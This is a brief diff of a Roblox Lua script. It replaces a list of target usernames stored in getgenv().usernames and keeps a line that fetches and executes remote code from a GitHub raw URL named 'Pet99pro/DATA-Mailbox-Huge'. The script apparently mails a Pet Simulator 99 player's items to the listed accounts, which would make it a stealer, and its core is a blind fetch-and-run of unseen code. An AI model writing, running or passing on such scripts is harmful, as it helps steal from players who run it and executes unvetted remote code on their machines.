@@ -1,3 +1,3 @@
-getgenv().usernames = {"congahpz002", "congahpz003"}
+getgenv().usernames = {"billo9xx", "barus1ik", "mcane9gb", "vermi4dm", "bozzo_3a9", "pavel7m6", "boudo_4uz", "gills6ii", "seitz5ut", "boekh6uo", "durra7ds", "berez1xg"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/Pet99pro/main/DATA-Mailbox-Huge"))()
